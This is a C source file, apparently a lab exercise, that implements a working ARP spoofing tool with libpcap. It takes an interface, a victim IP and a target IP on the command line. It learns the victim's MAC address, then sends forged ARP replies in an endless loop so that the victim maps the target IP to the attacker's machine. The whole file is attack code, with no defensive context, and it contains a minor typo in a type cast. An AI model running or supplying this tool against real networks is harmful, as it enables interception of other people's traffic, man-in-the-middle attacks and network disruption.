#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "arpheader.h"

void parse_usr_mac_address(char*,char*);
void parse_usr_ip_address (char*,struct in_addr*);
void make_packet(u_char**, int*, int, struct in_addr, struct in_addr, u_char*, u_char*);

int main(int argc, char** argv){
	char  errbuf[PCAP_ERRBUF_SIZE];
	char* interface = argv[1];
	char  host_ip_str[16];
	
	struct bpf_program fp;

	struct in_addr victim_ip;
	struct in_addr target_ip;
	struct in_addr host_ip	;

	u_char host_mac[6];

	u_char vict_mac[6];
	u_char* payload;
	const u_char* rcv_packet;

	bpf_u_int32 inet;
	bpf_u_int32 submask;

	pcap_t* handle;
	struct pcap_pkthdr* header;
	
	int length;
	
	if(argc < 4){printf("Argv 1 : Network Interface / Argv 2 : Victim IP Addr / Argv 3 : Target IP Addr\n");return -1;}

	parse_usr_mac_address(interface, host_mac);
	parse_usr_ip_address (interface, &host_ip);

	inet_ntop(AF_INET,&host_ip,host_ip_str,sizeof(char) * 16);
	inet_pton(AF_INET,argv[2],&victim_ip);
	inet_pton(AF_INET,argv[3],&target_ip);

	printf("Usr Mac Addr : ");
	for(int i = 0 ; i < 5 ; i++) printf("%x : ",host_mac[i]);
	printf("%x\nUsr IP Addr : %s\n",host_mac[5], inet_ntoa(host_ip));
	
	payload = (u_char *)malloc(sizeof(u_char) * 1000);
	handle = pcap_open_live(argv[1], 65536, 1, 1000, errbuf);
	if(handle == NULL){printf("Cannot Open Device %s\n", interface);return -1;}
	if(pcap_lookupnet(interface,&inet,&submask,errbuf) == -1){printf("Different Network\n");return -1;}
	if((pcap_compile(handle,&fp, "arp",0,inet) == -1)||(pcap_setfilter(handle,&fp) == -1)){printf("Filtering error\n");return -1;}
	
	make_packet(&payload, &length,__ARP_REQUEST__,host_ip,victim_ip,host_mac,vict_mac);
	for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);	
	while(pcap_sendpacket(handle, payload, length));
		
	/* Capture ARP Reply */
	while(pcap_next_ex(handle, &header, &rcv_packet)!=1);
	for(int i = 0,j = 6 ; i < 6 ; i++,j++){vict_mac[i] = rcv_packet[j];}
	printf("\n");
	for(int i = 0 ; i < 5 ; i++) printf("%X : ", vict_mac[i]);	
	printf("%X\n",vict_mac[5]);
	
	memset(payload,0,length);
	make_packet(&payload, &length,__ARP_REPLY__,target_ip,victim_ip,host_mac,vict_mac);
	
	while(1){
		while(pcap_sendpacket(handle,payload,length));
	}	

	return 0;
}

void parse_usr_mac_address(char* interface, char mac_addr[]){			/*PARSE MAC ADDRESS*/
	int fd;
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);	

	for(int i = 0 ; i < __MACADDR_LEN__ ; i++){mac_addr[i] = ifr.ifr_addr.sa_data[i];}
	close(fd);
}

void parse_usr_ip_address (char* interface, struct in_addr* ip){			/*PARSE IP  ADDRESS*/
	int fd;
	struct ifreq ifr;
	struct sockaddr_in* sin;
	const int IPADDR_START = 2;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name,interface,IFNAMSIZ-1);
	ioctl(fd,SIOCGIFADDR, &ifr);
	sin = (struct socaddr_in*) &ifr.ifr_addr;
	*ip = sin->sin_addr;
	close(fd);
}

void make_packet(u_char** packet, int* length, int operation, struct in_addr host_ip, struct in_addr victim_ip, u_char host_mac[], u_char vict_mac[]){
	struct ether_header eth;
	arphdr arp;
	
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = 0xff;		//broadcast!
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = vict_mac[i];	//unicast!
	for(int i = 0 ; i < 6 ; i++) eth.ether_shost[i] = host_mac[i];
	eth.ether_type = 0x0608;
	
	arp.hw_type = 0x0100;
	arp.proto_type = 0x0008;
	arp.hw_addr_len = 6;
	arp.proto_addr_len = 4;
	arp.operation = htons(operation);
	
	for(int i = 0 ; i < 6 ; i++) arp.src_hw_addr[i] = host_mac[i];
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = 0x00;
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = vict_mac[i];

 	memcpy(arp.src_ip_addr, &host_ip, sizeof(host_ip));
	memcpy(arp.dst_ip_addr, &victim_ip, sizeof(victim_ip));
	
	memcpy((*packet), &eth,sizeof(eth));
	(*length) = sizeof(eth);
	memcpy((*packet) + (*length) , &arp, sizeof(arphdr));

	(*length) +=  sizeof(arphdr);
}
